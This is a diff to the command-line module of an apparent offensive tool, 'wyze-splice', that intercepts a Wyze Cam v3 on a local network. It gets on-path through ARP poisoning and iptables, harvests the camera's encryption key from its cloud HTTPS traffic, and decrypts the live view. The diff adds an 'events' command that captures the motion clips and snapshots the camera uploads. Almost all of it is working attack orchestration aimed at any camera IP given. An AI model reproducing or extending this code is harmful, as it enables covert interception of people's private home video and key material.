@@ -1,6 +1,7 @@
 """wyze-splice: decrypt a Wyze Cam v3 live view while the app keeps playing.
 
-  sudo wyze-splice run --target 192.168.1.20
+  sudo wyze-splice run --target 192.168.1.20      splice the next live view
+  sudo wyze-splice events --target 192.168.1.20   save motion-event clips
   wyze-splice extract captures/<run>/av.bin
 """
 import argparse
@@ -53,21 +54,39 @@ def _cache_enr(target, enr, mac):
     os.chmod(path, 0o600)
 
 
-def _harvest(target, us, timeout):
-    from .enr import Harvester
-    h = Harvester(target, us)
-    h.start()
+def _wait_enr(tap, target, timeout):
     print("[*] waiting for the camera's ENR: it sends it to api.wyzecam.com "
-          "at boot, on motion alarms, and every few hours")
-    try:
-        deadline = time.time() + timeout if timeout else None
-        while not h.found.wait(5):
-            if deadline and time.time() > deadline:
-                return None
-    finally:
-        h.stop()
-    print(f"[+] ENR harvested from the camera's HTTPS (mac {h.mac})")
-    return h.enr, h.mac
+          "at boot, on motion alarms (walk past it), and every few hours")
+    deadline = time.time() + timeout if timeout else None
+    while not tap.enr_found.wait(5):
+        if deadline and time.time() > deadline:
+            return None
+    print(f"[+] ENR harvested from the camera's HTTPS (mac {tap.mac})")
+    _cache_enr(target, tap.enr, tap.mac)
+    return tap.enr
+
+
+def _event_saved(path):
+    print(f"[+] motion event: {path}")
+
+
+def _arm(a, out):
+    """Root checks, then get on-path. Returns (onpath, us)."""
+    if os.geteuid() != 0:
+        sys.exit("needs root (ARP, iptables, raw and transparent sockets)")
+    from .netutil import ensure_conntrack, iface_for, local_ip_for
+    from .onpath import OnPath
+    signal.signal(signal.SIGTERM, _sigterm)
+    # a parent shell may have started us with SIGINT ignored
+    signal.signal(signal.SIGINT, signal.default_int_handler)
+    out.mkdir(parents=True, exist_ok=True)
+    us = local_ip_for("8.8.8.8")   # the address we NAT the camera to
+    ensure_conntrack()
+    _inhibit_sleep()
+    onpath = OnPath(a.target, iface_for(a.target), poison=not a.on_path)
+    atexit.register(onpath.close)
+    onpath.start()
+    return onpath, us
 
 
 def _give_to_user(path):
@@ -81,49 +100,79 @@ def _give_to_user(path):
 
 
 def cmd_run(a):
-    if os.geteuid() != 0:
-        sys.exit("run needs root (ARP, iptables, transparent sockets)")
-    from .netutil import ensure_conntrack, iface_for, local_ip_for
-    from .onpath import OnPath
+    from .cloud import CloudTap
     from .splice import Splicer
 
-    signal.signal(signal.SIGTERM, _sigterm)
     out = Path(a.out or f"captures/{time.strftime('%Y%m%d-%H%M%S')}")
-    out.mkdir(parents=True, exist_ok=True)
-    us = local_ip_for("8.8.8.8")   # the address we NAT the camera to
-    ensure_conntrack()
-    _inhibit_sleep()
-    onpath = OnPath(a.target, iface_for(a.target), poison=not a.on_path)
-    atexit.register(onpath.close)
-    spliced = 0
+    spliced, tap = 0, None
     try:
-        onpath.start()
+        onpath, us = _arm(a, out)
         enr = a.enr
-        if not enr:
+        if not enr and not a.reharvest:
             c = _cached_enr(a.target)
-            if c and not a.reharvest:
+            if c:
                 enr = c["enr"]
                 print(f"[*] using the cached ENR for {a.target} "
                       f"({STATE_DIR / 'enr.json'})")
+        if not enr or not a.no_events:
+            tap = CloudTap(a.target,
+                           events_dir=None if a.no_events else out / "events",
+                           on_event=_event_saved)
+            tap.start()
         if not enr:
-            got = _harvest(a.target, us, a.harvest_timeout)
-            if not got:
+            enr = _wait_enr(tap, a.target, a.harvest_timeout)
+            if not enr:
                 sys.exit("no ENR seen; pass --enr, or retry later")
-            enr = got[0]
-            _cache_enr(a.target, *got)
+            if a.no_events:
+                tap.stop()
         splicer = Splicer(a.target, enr, us, out,
                           pass_through=a.pass_through, journal=a.journal)
         spliced = splicer.run(sessions=None if a.keep_going else 1)
     except KeyboardInterrupt:
         pass
     finally:
-        onpath.close()
+        if tap:
+            tap.stop()
+        if "onpath" in locals():
+            onpath.close()
     av = out / "av.bin"
     if spliced and av.exists() and not a.no_video:
         _export(av, out)
     _give_to_user(out)
-    print(f"[+] {spliced} session(s) spliced; output in {out}/")
+    n_ev = len(tap.events) if tap else 0
+    print(f"[+] {spliced} session(s) spliced, {n_ev} event file(s) saved; "
+          f"output in {out}/")
     return 0 if spliced else 1
+
+
+def cmd_events(a):
+    """On-path + cloud tap only: save motion events until Ctrl-C."""
+    from .cloud import CloudTap
+    out = Path(a.out or f"captures/events-{time.strftime('%Y%m%d-%H%M%S')}")
+    tap = None
+    try:
+        onpath, _us = _arm(a, out)
+        tap = CloudTap(a.target, events_dir=out, on_event=_event_saved)
+        tap.start()
+        print(f"[*] saving {a.target}'s motion events to {out}/ "
+              f"(Ctrl-C to stop)")
+        while True:
+            clips = sum(1 for p in tap.events if p.name == "clip.mp4")
+            if a.count and clips >= a.count:
+                break
+            if tap.enr_found.is_set() and not _cached_enr(a.target):
+                _cache_enr(a.target, tap.enr, tap.mac)
+            time.sleep(1)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        if tap:
+            tap.stop()
+        if "onpath" in locals():
+            onpath.close()
+    _give_to_user(out)
+    print(f"[+] {len(tap.events) if tap else 0} event file(s) in {out}/")
+    return 0
 
 
 def _export(av, outdir):
@@ -180,7 +229,19 @@ def main(argv=None):
                    help="also write journal.jsonl with all key material")
     r.add_argument("--no-video", action="store_true",
                    help="skip the MP4 export at the end")
+    r.add_argument("--no-events", action="store_true",
+                   help="don't save motion-event clips uploaded meanwhile")
     r.set_defaults(fn=cmd_run)
+    ev = sub.add_parser("events", help="get on-path and save motion-event "
+                                       "clips and snapshots until Ctrl-C")
+    ev.add_argument("--target", required=True, help="camera IPv4 on this LAN")
+    ev.add_argument("--out", help="output directory "
+                                  "(default captures/events-<time>)")
+    ev.add_argument("--on-path", action="store_true",
+                    help="this host already routes the camera: skip ARP")
+    ev.add_argument("--count", type=int, default=0,
+                    help="stop after this many clips (default: run until Ctrl-C)")
+    ev.set_defaults(fn=cmd_events)
     e = sub.add_parser("extract", help="av.bin -> video.mp4 + frame.jpg")
     e.add_argument("av_bin")
     e.add_argument("outdir", nargs="?")
